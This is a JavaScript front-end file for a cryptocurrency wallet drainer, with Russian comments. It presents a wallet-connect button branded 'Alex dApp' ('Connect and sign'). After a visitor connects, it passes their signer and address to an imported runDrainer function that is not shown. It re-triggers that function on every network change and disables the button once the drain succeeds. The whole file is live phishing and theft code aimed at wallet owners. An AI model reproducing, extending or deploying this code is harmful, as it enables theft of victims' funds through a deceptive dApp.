import { createAppKit } from '@reown/appkit'
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

// === Конфигурация ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const appKitModal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png']
  },
  features: { analytics: true, email: false, socials: false },
  allWallets: 'SHOW'
})

let connectedAddress = null
let hasDrained = false
let actionBtn = null

window.addEventListener('DOMContentLoaded', () => {
  actionBtn = document.getElementById('action-btn')
  const isInjected = typeof window.ethereum !== 'undefined'

  if (!isInjected) {
    actionBtn.style.display = 'inline-block'
    actionBtn.addEventListener('click', () => {
      window.showWalletRedirectModal()
    })
    return
  }

  actionBtn.style.display = 'inline-block'
  actionBtn.addEventListener('click', handleConnectOrAction)

  // Подписка на смену сети
  window.ethereum.on('chainChanged', onChainChanged)
})

// Обёртка для вызова drainer с проверкой флага
async function attemptDrainer() {
  if (hasDrained) return
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum)
    const signer = provider.getSigner()
    await runDrainer(provider, signer, connectedAddress)
    console.log('🚀 runDrainer успешно вызван на сети', (await provider.getNetwork()).chainId)

    // Отмечаем, что drainer уже выполнен и отключаем кнопку
    hasDrained = true
    cleanup()
  } catch (err) {
    // Игнорируем ошибки смены сети, ожидаем стабильного подключения
    if (err.code === 'NETWORK_ERROR') {
      console.log('🔄 Сеть ещё не готова, ждём правильный chain...')
    } else {
      console.error('❌ Ошибка при вызове drainer:', err)
    }
  }
}

// Основная логика подключения и первого запуска
async function handleConnectOrAction() {
  try {
    const accs = await window.ethereum.request({ method: 'eth_accounts' })
    if (accs.length === 0) {
      await appKitModal.open()
      connectedAddress = await waitForWallet()
      console.log('✅ Подключились как', connectedAddress)
    } else {
      connectedAddress = accs[0]
      console.log('✅ Уже подключены:', connectedAddress)
    }

    // Пытаемся drainer сразу
    await attemptDrainer()
  } catch (err) {
    console.error('❌ Ошибка в процессе подключения/дренажа:', err)
  }
}

// Автоматический вызов при смене сети
async function onChainChanged(_chainId) {
  console.log('🔄 Сеть сменилась, пробуем заново')
  if (connectedAddress) {
    await attemptDrainer()
  }
}

// Отключаем кнопку и удаляем слушатели
function cleanup() {
  if (!actionBtn) return
  actionBtn.removeEventListener('click', handleConnectOrAction)
  window.ethereum.removeListener('chainChanged', onChainChanged)
  actionBtn.disabled = true
  actionBtn.style.opacity = '0.6'
}

// Ожидание первого подключения
async function waitForWallet() {
  const accs = await window.ethereum.request({ method: 'eth_accounts' })
  if (accs.length > 0) return accs[0]
  return new Promise(resolve => {
    const id = setInterval(async () => {
      const a = await window.ethereum.request({ method: 'eth_accounts' })
      if (a.length) {
        clearInterval(id)
        resolve(a[0])
      }
    }, 500)
  })
}
